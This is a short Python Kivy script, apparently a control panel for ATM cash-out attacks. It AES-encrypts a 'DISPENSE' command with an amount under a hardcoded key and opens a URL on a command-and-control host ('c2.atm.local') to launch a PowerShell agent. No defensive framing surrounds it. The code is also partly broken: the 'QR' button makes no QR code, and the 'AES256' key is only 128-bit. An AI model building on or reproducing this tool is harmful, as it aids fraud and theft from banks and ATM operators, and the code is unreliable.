from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
import webbrowser, os
from Crypto.Cipher import AES
import base64
def encrypt(data):
    cipher = AES.new(b'ThisKeyForAES256', AES.MODE_ECB)
    pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
    ct = cipher.encrypt(pad(data).encode('utf-8'))
    return base64.b64encode(ct).decode('utf-8')
class ATMUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical')
        self.amount = TextInput(hint_text='Withdraw Amount')
        self.add_widget(self.amount)
        self.add_widget(Button(text='Launch + QR', on_press=self.trigger))
    def trigger(self, instance):
        amt = self.amount.text
        enc = encrypt(f'DISPENSE_{amt}')
        url = f'https://c2.atm.local/launch_agent.ps1?code={enc}'
        webbrowser.open(url)
class MirApp(App):
    def build(self): return ATMUI()
if __name__ == '__main__': MirApp().run()
